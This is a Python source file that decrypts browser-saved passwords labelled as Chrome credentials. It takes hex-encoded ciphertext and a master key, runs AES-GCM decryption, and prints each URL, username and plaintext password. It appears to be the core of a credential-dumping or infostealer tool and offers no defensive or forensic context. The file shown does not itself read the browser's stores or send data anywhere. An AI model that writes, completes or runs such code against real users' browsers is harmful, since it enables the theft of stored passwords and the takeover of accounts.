from colored import fg
from Cryptodome.Cipher import AES

block = fg('light_sky_blue_3a')
title = fg('blue')
data = fg('dark_green_sea')


def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)


def generate_cipher(master_key, iv):
    return AES.new(master_key, AES.MODE_GCM, iv)


def decrypt_cipher(encrypted_password, master_key):
    try:
        encrypted_password = bytes.fromhex(encrypted_password)
        master_key = bytes.fromhex(master_key)
        iv = encrypted_password[3:15]
        payload = encrypted_password[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
        return decrypted_pass
    except:
        return "Unknown"


def handle_chrome_passwords(creds_arr: [], master_key: str) -> None:
    print(title + "Chrome Credentials:")
    for num in creds_arr:
        creds_json = creds_arr.get(num)
        enc_password = creds_json[2].get('password')
        plaint_text_pass = decrypt_cipher(enc_password, master_key)
        plaint_text_pass and output_chrome_credentials(
            [creds_json[0].get('url'), creds_json[1].get('username'), plaint_text_pass])


def output_chrome_credentials(print_object: []):
    print(block + '[--]')
    print(title + '|Url|' + data + print_object[0])
    print(title + '|Username|' + data + print_object[1])
    print(title + '|Password|' + data + print_object[2])
